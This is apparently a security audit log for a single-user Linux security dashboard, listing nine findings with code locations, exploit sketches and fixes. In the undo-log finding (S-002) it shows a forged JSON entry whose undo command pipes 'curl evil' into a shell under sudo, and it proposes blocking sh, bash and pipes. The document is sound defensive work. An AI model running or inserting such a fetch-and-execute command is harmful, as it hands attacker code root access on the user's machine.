# SECURITY

**Function:** Security audit log — every issue with a stable ID, file:line evidence, exploit sketch and concrete fix. Severity reflects realistic threat model for a single-user desktop tool, not theoretical worst case.

Last reviewed: 2026-05-03

---

## Severity legend

- **CRITICAL** — Pre-auth or unauthenticated remote compromise / arbitrary command execution by anyone, or silent data destruction.
- **HIGH** — Local privilege escalation, persistent attacker control of the user account, or any path where a third party's input executes with sudo.
- **MEDIUM** — Tamper-after-foothold (attacker who already has user-level RW on `$HOME` can escalate via the app's prompt-and-click flows), or weakened safety nets.
- **LOW** — Defence-in-depth gap, fragile parsing, fingerprintable behaviour, hardening recipe quality issues.

The user is the **operator** of the app — sudo password is theirs, every destructive action requires a click on a confirmation dialog, and `~/.audit-dashboard.conf` / `~/.audit-dashboard-undo.log` already live under their account. Local-tampering issues (S-002, S-005) are scored MEDIUM/LOW because compromising those files already implies compromising the user.

---

## Findings

### S-001 (LOW) — `_act` parses confirmed action commands with `cmd.split()` instead of `shlex.split()`

- **Where:** [linux-security-dashboard.py:2554](linux-security-dashboard.py#L2554) — `w = CommandWorker(cmd.split(), sudo=True, password=sudo_password)`
- **Convention being violated:** [agent_docs/code_conventions.md](agent_docs/code_conventions.md) — *"Parse user-facing fix commands with `shlex.split()`. Never `cmd.split()`."* Documented as a regression guard in [agent_docs/known_bugs.md](agent_docs/known_bugs.md).
- **Why it is currently safe:** `cmd_remove`/`cmd_disable` strings reach `_act` from one of two sources:
  - Hardcoded literals in the risky-services / risky-ports tables ([5541-5545](linux-security-dashboard.py#L5541-L5545), [5598-5604](linux-security-dashboard.py#L5598-L5604)).
  - `" ".join(pkg_remove(pkg))` where `pkg` was filtered through `valid_pkg()` first ([5505](linux-security-dashboard.py#L5505), [5701](linux-security-dashboard.py#L5701)).
  None of those sources contains shell metacharacters, embedded quotes, or whitespace inside arguments, so `cmd.split()` produces an identical argv list.
- **Exploit sketch:** A future contributor adds a finding with `cmd_remove="apt purge 'foo bar'"` (a package with a space, or a quoted shell-style argument). `cmd.split()` would split that into 4 tokens (`['apt', 'purge', "'foo", "bar'"]`), passing an unquoted token to apt. With `shlex.split()` the same string parses to 3 tokens. The risk isn't injection (argv prevents that) — it's a silent argv mis-parse that runs the wrong command under sudo.
- **Fix:** Replace `cmd.split()` with `shlex.split(cmd)` in `_act`. Same change applies to S-002.

### S-002 — Free-form privileged undo execution — Fixed locally in Increment 2 (pending review)

Review scope: undo record validation, presentation and execution only, 2026-11-15.
New records use `schema_version: 2` and an `undo` operation. `build_undo_argv`
validates the version, exact operation fields, manager and target, then builds
argv from application-owned templates. No stored `cmd` or `undo_cmd` is executed.
Allowed operations are repository package installation using the matching apt/dnf
backend, enable/start of xrdp/avahi-daemon/rpcbind, and unmask of cups. Package
arguments reject paths, options, version expressions, local-package suffixes
and apt action suffixes. Pacman and firewall rollback are not added.

The UI derives previews and safety descriptions from the validated operation.
Legacy records remain visible but non-executable; invalid operations cannot
prompt for sudo or construct a worker. Execution revalidates after confirmation
and authentication and rejects an operation changed during either dialog.
The bounded loader skips malformed/non-object JSON and normalizes display fields;
it never rewrites the existing history. New records are appended only.

Residual trust: file contents are not authenticated. A writer can forge a valid
allowed operation and historical metadata, but cannot choose arbitrary programs
or options through the undo record. User confirmation and sudo policy remain
necessary. Installed package repositories, package scripts, local service
units and system executable resolution are trusted. This is not protection
against replacement of the application or compromise of the user process itself.
File symlink hardening and the successful-rollback history persistence defect
remain separate work. Exit zero does not prove complete restoration.

Validation: mocked worker/callback tests, pure parser tests and temporary-file
history tests in `tests/test_structured_undo.py`; no privileged commands or full
GUI were exercised. Real deployment and sudo-policy behavior remain unverified.

#### Historical finding and proposed remedies (pre-Increment 2)

The following describes the old implementation and is retained as evidence,
not current execution behavior. Its quoted shell payload was not demonstrated;
whitespace splitting did not preserve its shell quoting. A same-user-readable
HMAC key would not authenticate history against that same-user attacker.


- **Where:** [linux-security-dashboard.py:5114-5116](linux-security-dashboard.py#L5114-L5116) — `cmd = entry["undo_cmd"].replace("sudo ", "").split()` followed by `CommandWorker(cmd, sudo=True, password=sudo_password)`. The entries come from [load_undo_log()](linux-security-dashboard.py#L1232-L1248) which `json.loads` each line of `~/.audit-dashboard-undo.log` with no signature, schema check or argv validation.
- **Trust boundary:** The log file lives under the user's home directory. Anyone with user-level RW (which is the same trust level as the sudo password the dialog will collect) can edit it. The interesting case is a malicious actor who landed only **read-only** persistence in `$HOME` originally and now plants a poisoned line waiting for the user to click UNDO.
- **Exploit sketch:**
  1. Attacker appends a crafted JSON line to `~/.audit-dashboard-undo.log`:
     `{"time":"2026-04-01 09:00:00","action":"undo 'cleanup'","cmd":"sudo apt purge fake","undo_cmd":"sudo bash -c 'curl evil|sh'","risk_level":"LOW","name":"fake"}`.
  2. User opens the Undo panel, sees an entry from "earlier", clicks UNDO.
  3. The displayed UNDO command is shown in the dialog ([5097-5101](linux-security-dashboard.py#L5097-L5101)) but most users tap-through. The command runs with sudo.
- **Mitigations already in place:** The confirmation dialog **does** print the full undo command in the message body, so a careful user can spot the difference. `_act` only stores entries that the app itself produced ([2541-2551](linux-security-dashboard.py#L2541-L2551)).
- **Fix (defence in depth):**
  - Reject `undo_cmd` strings whose argv (after `shlex.split`) contains `sh`/`bash`/`-c`/pipes/redirects, OR enforce that the first token after stripping `sudo` matches a small allow-list (`apt`, `apt-get`, `dnf`, `pacman`, `systemctl`, `ufw`).
  - Use `shlex.split(entry["undo_cmd"])`, drop the leading `sudo`, then validate.
  - Optionally: HMAC-tag each line with a key stored in `~/.audit-dashboard.conf` (mode 0600) and refuse to run unsigned entries.

### S-003 (LOW) — Sudo password held in `bytes` for the lifetime of every worker

- **Where:** `CommandWorker.__init__` stores `self.password = password` ([1270](linux-security-dashboard.py#L1270)); `StreamingCommandWorker` does the same ([1369](linux-security-dashboard.py#L1369)). `GuidedWizard._fix_password` ([3171](linux-security-dashboard.py#L3171)) keeps it across an entire multi-step fix queue. None of the workers zero the buffer after use.
- **Why it matters:** Python `bytes` are immutable, so a `del` doesn't actually overwrite memory. A coredump or a same-process memory inspector during the few hundred milliseconds the worker is alive would yield the password. A `Strict-once-per-prompt` worker cycle is ~seconds at most; the wizard can hold it through 4-7 commands.
- **Mitigations already in place:** Core dumps are restricted by the wizard itself (`_fix_coredump` writes `fs.suid_dumpable=0`); `prompt_for_sudo_password` only prompts when sudo isn't already cached.
- **Fix:** Acceptable to defer for a desktop tool. If hardened: switch to a `bytearray`, write the password into it, and explicitly zero it (`for i in range(len(buf)): buf[i] = 0`) in a `finally` after `subprocess.run`. Pop `_fix_password` to `None` immediately after the wizard's last command.

### S-004 (LOW) — `has_internet()` discloses app launch to Cloudflare

- **Where:** [linux-security-dashboard.py:733-737](linux-security-dashboard.py#L733-L737) — TCP connect to `1.1.1.1:443` on every CVE-scan / install attempt, plus on every `_pre_scan` for the panel that owns that scan.
- **Threat model:** A network observer can correlate the bare TCP probe + the immediate follow-up to `ubuntu.com/security/cves.json` to fingerprint the tool. `1.1.1.1` is Cloudflare DNS; a TCP-only probe also leaves no DNS trace, but any user wanting to opt out of Cloudflare entirely can't.
- **Fix:** Allow override via `~/.audit-dashboard.conf` (e.g. `[prefs] internet_probe = ubuntu.com:443`), or make the probe configurable in the startup wizard. Currently no setting exposes this.

### S-005 (LOW) — `_fix_coredump` appends to `/etc/sysctl.conf` instead of writing a dedicated drop-in

- **Where:** [linux-security-dashboard.py:3525](linux-security-dashboard.py#L3525) — `["sh", "-c", "echo fs.suid_dumpable=0 >> /etc/sysctl.conf"]`.
- **Why it matters:**
  - Re-running the wizard's "Restrict Core Dumps" fix appends a duplicate line every time. Over many runs `/etc/sysctl.conf` accumulates redundant entries — cosmetic, but eventually ugly.
  - Mixing app-managed config into the distro file makes upgrade behaviour unpredictable. Every other wizard fix correctly uses `> /etc/sysctl.d/99-*-hardening.conf` (kernel: [3537](linux-security-dashboard.py#L3537), network: [3552-3566](linux-security-dashboard.py#L3552-L3566)).
- **Fix:** Change to `> /etc/sysctl.d/99-coredump-hardening.conf` like the sibling fixes. Idempotent and reversible.

### S-006 (LOW) — Quick-check "Password file has correct permissions" relies on substring `"rw-r--r--" in o`

- **Where:** [linux-security-dashboard.py:2779](linux-security-dashboard.py#L2779) — pass test for `ls -la /etc/passwd`.
- **Why it matters:**
  - Real-world false positive: an ACL-modified file prints `-rw-r--r--+` — still passes our substring test even though `getfacl` may show write to a non-root user.
  - The output also contains the owner / group username; if a username happens to contain the literal `rw-r--r--`, the check would pass without the file actually having that mode.
- **Fix:** `subprocess.run(["stat", "-c", "%a %u %g", "/etc/passwd"])` and assert mode `== "644"`, owner `== "0"`, group `== "0"`. Removes any text-parsing fragility.

### S-007 (LOW) — `pkg_installed` uses `"ii" in stdout` to detect installed packages

- **Where:** [linux-security-dashboard.py:619-621](linux-security-dashboard.py#L619-L621).
- **Why it matters:** The `dpkg -l <pkg>` output includes header lines that contain words and descriptions. A removed-but-not-purged package shows `rc` not `ii`, but `dpkg -l` also prints `||/ Name ...` which contains slashes; a long Description column might contain the literal `ii`. Substring check is too loose.
- **Fix:** Inspect the `^ii ` line directly: `any(line.startswith("ii ") and pkg in line.split() for line in stdout.splitlines())`.

### S-008 (LOW) — Crontab `~` may not expand reliably

- **Where:** [linux-security-dashboard.py:4558, 4651-4655](linux-security-dashboard.py#L4651-L4655) — `LOG = "~/.audit-dashboard-schedule.log"` interpolated into a shell command run by cron's `/bin/sh -c`.
- **Why it matters:** POSIX `sh` expands tilde only in word position (start of a word, no preceding text). After `>` the redirection target is itself a word, so `> ~/file` should expand — but behaviour differs across shells (`dash` does, `mksh` debatable). On a system where cron uses a shell that doesn't expand `~`, the cron job silently fails.
- **Fix:** Resolve the home-directory path explicitly when building the line: `LOG = str(Path.home() / ".audit-dashboard-schedule.log")` or use `$HOME/.audit-dashboard-schedule.log`. Already-installed crontab entries should be migrated when `_install` overwrites.

### S-009 — Historical free-form sudo stripping — Fixed locally in Increment 2 (pending review)

Current behavior: `_run_undo` no longer strips or splits stored commands. It
uses the validated structured builder described in S-002. The evidence below
records the earlier implementation and its proposed string-parser fix.

- **Where:** [linux-security-dashboard.py:5115](linux-security-dashboard.py#L5115).
- **Why it matters:** `str.replace()` strips every occurrence of `"sudo "`. A package name is constrained by `valid_pkg` so it can't contain spaces, but the pattern is fragile and surprising. Any future undo command that legitimately runs `sudo` twice (unusual but not impossible — e.g. `sudo bash -c 'sudo systemctl ...'`) would lose the inner `sudo`.
- **Fix:** Use `text.removeprefix("sudo ")` (Python 3.9+; the project targets 3.10+). Even better: store the undo command as an argv list in the JSONL and skip string-stripping entirely.

---

## Recently fixed

S-002 and S-009 have local Increment 2 fixes pending acceptance review (2026-11-15).
Their historical evidence is retained above. Other S-001 through S-009 findings
remain at their earlier review status; they were not re-audited in this increment. Items confirmed by the existing regression-guards list in [agent_docs/known_bugs.md](agent_docs/known_bugs.md) are *prior* fixes — they predate this file's ID series and aren't renumbered in.

---

## Out-of-scope

- **TLS pinning for Ubuntu CVE API.** The `urllib` call uses `ssl.create_default_context()` against the system trust store, which is the right default for an OS audit tool. Pinning a specific CA would break on every OpenSSL major upgrade.
- **Permission hardening of `~/.audit-dashboard.conf` and `~/.audit-dashboard-undo.log`.** They contain no secrets — just preferences and reversible action history. The undo log already has an integrity gap (S-002); permission tightening alone wouldn't close it.
- **Multi-user isolation.** This is a single-user GUI; no design intent for shared installs.
- **Anti-tamper for the script itself.** Distributed via Debian packaging which already verifies signatures at install time. A user who replaced `/usr/lib/linux-security-dashboard/linux-security-dashboard.py` already has root.
- **Lynis output sanitisation.** Lynis runs under sudo and produces text we then `re.search` over. Lynis itself is the trusted source — if it's compromised, sanitisation here is moot.
- **Mass-targeting / DoS scenarios.** Not applicable to a desktop audit tool with no listening surface.

---

## Cross-references

- [B-002](BUGS.md#b-002): saved profile read-but-not-applied — has security implications because the user's chosen "what's normal for this machine" tag never persists, so HIGH/MEDIUM tagging may differ between sessions.
- [R-010](CODE_REVIEW.md#r-010): the `cmd.split()` vs `shlex.split()` inconsistency tracked here as S-001 / S-002 also shows up in the code-review pass.
- [P-006](PERFORMANCE.md#p-006): sequential CVE scan timing has a security-adjacent angle (a slow CVE pass discourages users from running it).
